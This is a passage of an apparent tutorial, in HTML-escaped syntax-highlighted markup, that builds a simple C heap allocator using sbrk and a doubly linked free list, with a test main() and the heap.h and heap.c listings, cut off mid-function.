                &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// Reduce the size of the heap&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;heap_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The basic heap allocator implementation is complete. Now a &lt;code class=&quot;highlighter-rouge&quot;&gt;main()&lt;/code&gt; function can be created to test out whether the heap allocator works.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// Main function&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;buf0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Buffer 0 is working.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;buf1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Buffer 1 is working.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Freeing buffer 0.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;heap_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;buf2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Buffer 2 has been allocated.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Buffer 2 has been allocated using buffer 0's chunk.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Freeing buffer 1.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;heap_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Freeing buffer 2.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;heap_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is what heap.h looks like:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#ifndef HEAP_H
#define HEAP_H
&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// Header for each chunk of allocated memory&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_header&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Actual header data that we care about&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Next value in linked list.&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;union&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Previous value in list.&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Amount of memory allocated for user.&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Set to 1 if memory isn't being used.&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;align&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Only used to align header to 32 bytes&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// Functions&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Allocates memory on the heap&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;best_fit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Finds a free block (if available)&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Frees memory on the heap&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_defrag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Defrags the heap&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;#endif
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is what heap.c looks like:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;pthread.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &quot;heap.h&quot;
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;// Start and end of the heap&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// Head for the linked list of free chunks&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// Allocates memory on the heap&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;heap_alloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// Make sure some idiot didn't try to allocate zero bytes of memory.&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// If the heap has not been initialized, then initialize it&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;heap_start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sbrk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;heap_end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;heap_start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// Check if a suitable chunk already exists in the linked list.&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;best_fit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// If we found a suitable free chunk in the linked list, then remove&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// that chunk from the linked list of free chunks.&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;head&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prev&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// If there are no free chunks in the linked list with a big enough&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// size for the requested data, then increase the size of the heap.&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sbrk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;heap_header_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
